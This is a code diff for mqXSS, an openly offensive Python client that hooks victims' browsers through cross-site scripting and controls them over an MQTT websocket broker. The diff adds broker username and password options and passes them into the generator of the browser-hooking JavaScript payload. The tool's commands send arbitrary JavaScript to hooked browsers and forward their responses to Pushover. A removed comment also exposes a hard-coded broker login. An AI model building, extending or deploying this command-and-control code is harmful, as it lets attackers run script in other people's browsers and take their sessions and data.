@@ -28,10 +28,12 @@ from os import getcwd
 from pathlib import Path
 
 # Cli arguments
-parser = argparse.ArgumentParser(description="mqXSS: blind XSS client using websockets over mqtt", formatter_class=argparse.RawDescriptionHelpFormatter)
+parser = argparse.ArgumentParser(description="mqXSS: XSS client using websockets over mqtt", formatter_class=argparse.RawDescriptionHelpFormatter)
 parser.add_argument("-b", dest="broker", required=True, help="Broker domain name")
 parser.add_argument("-p", dest="bport", required=True, help="Broker port")
 parser.add_argument("-t", dest="btopic", required=True, help="Base topic")
+parser.add_argument("-u", dest="buser", required=False, help="Broker user name")
+parser.add_argument("-pw", dest="bpasswd", required=False, help="Broker password")
 parser.add_argument("-g", dest="generate", required=False, help="Generate JS file to hook browsers with", action="store_true")
 parser.add_argument("-po", dest="push", required=False, help="Send hooked browser responses to pushover", action="store_true")
 parser.add_argument("-js", dest="js", required=False, help="Send javascript to hooked browsers")
@@ -44,6 +46,8 @@ if len(sys.argv)==1:
 mbroker = args.broker
 mport = args.bport
 mtopic = args.btopic
+muser = args.buser
+mpasswd = args.bpasswd
 gen = args.generate
 ppush = args.push
 jsarg = args.js
@@ -67,8 +71,8 @@ Commands:   'hooked' view hooked browsers.
 	    'exit' to leave.
 '''
 print(mqxss)
-# Define subscriptions folders and var
 
+# Define subscriptions folders and var
 cwd = getcwd()
 topic_out = mtopic+"/out/#"
 topic_cmd = mtopic+"/cmd/"
@@ -85,6 +89,7 @@ def handler(signum, frame):
 	if res == 'y':
 		exit(1)
 signal.signal(signal.SIGINT, handler)
+
 # pushover variables
 ptoken = "set pushover token here"
 userkey = "set user key here"
@@ -218,15 +223,19 @@ sjs=threading.Thread(target=sendjs)
 if __name__ == "__main__":
 	sessions.chooked()
 	sessions.cunhooked()
-	client = mqtt.Client(transport='websockets',client_id="archibald-spelunking",clean_session=False)
+	client = mqtt.Client(transport='websockets',client_id="crinkle-dinos",clean_session=False)
 	client.tls_set()
 	client.message_callback_add(topic_ss,on_download)
 	client.message_callback_add(topic_out,on_message)
 	client.message_callback_add(topic_rdy,on_rdy)
 	client.on_connect = on_connect
-	#client.username_pw_set(username="flagrantmarshmallow",password="rickjame$")
+	if muser:
+		client.username_pw_set(username=muser,password=mpasswd)
+	else:
+		muser = ""
+		mpasswd = ""
 	if gen:
-		generate.ws(mbroker, mport, mtopic)
+		generate.ws(mbroker, mport, mtopic, muser, mpasswd)
 		print("[[grey82]mqXSS[/grey82]] JS payload created at "+generate.ws.barbosa)
 	tmqtt.start()
 	sjs.start()
